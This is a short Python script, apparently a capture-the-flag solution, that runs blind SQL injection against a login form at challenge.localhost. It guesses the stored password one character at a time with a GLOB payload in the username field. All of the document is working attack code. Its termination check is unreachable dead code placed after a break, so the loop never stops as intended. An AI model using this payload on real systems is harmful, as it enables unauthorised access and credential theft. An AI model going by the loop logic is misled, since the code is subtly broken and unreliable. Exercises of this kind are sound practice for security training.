import requests
import string

#
s = requests.Session()
url = "http://challenge.localhost:80"

# define characters to brute force
searchspace = string.ascii_letters + string.digits + '{}_.-'
end_char = "}"

# brute force solution
solution = ""
found = False
while not found:
    for c in searchspace:
        data = {
                'username': f'" OR password GLOB "{solution}{c}*" -- - ',
                'password': 'pass'
            }
        response = requests.post(url, data=data)
        if response.text.startswith('Hello'):
            solution += c
            print(solution)
            break

            if c == end_char:
                found = True
                break

